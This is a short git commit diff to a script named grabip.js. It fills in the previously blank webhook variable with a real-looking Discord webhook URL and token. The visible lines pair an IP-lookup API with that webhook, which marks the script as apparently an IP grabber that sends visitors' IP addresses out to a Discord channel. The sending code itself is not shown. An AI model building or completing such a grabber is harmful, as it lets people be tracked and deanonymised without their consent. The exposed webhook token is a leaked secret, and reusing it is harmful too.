88a084f7577a39397cf16b968ffac835580cd9ae
Szefit0-xd1 <szefit40@gmail.com>
2026-09-13 17:49:23 +0200

    Update webhook URL in grabip.js

--- grabip.js
+++ grabip.js
@@ -2,7 +2,7 @@
 const ipifyAPI = "https://api.ipify.org?format=json";
 
 
-const webhookURL = "Input your webhook url here (your webhook url can be seen easily)";
+const webhookURL = "https://discordapp.com/api/webhooks/1548627600061235311/0P_pT9nlRqtxX_ladYn3hJhnY8MxUqoAZjEQnexylIUTliPb_lhYHyllVWN80zXd4ZSX";
 
 
 async function getIP() {
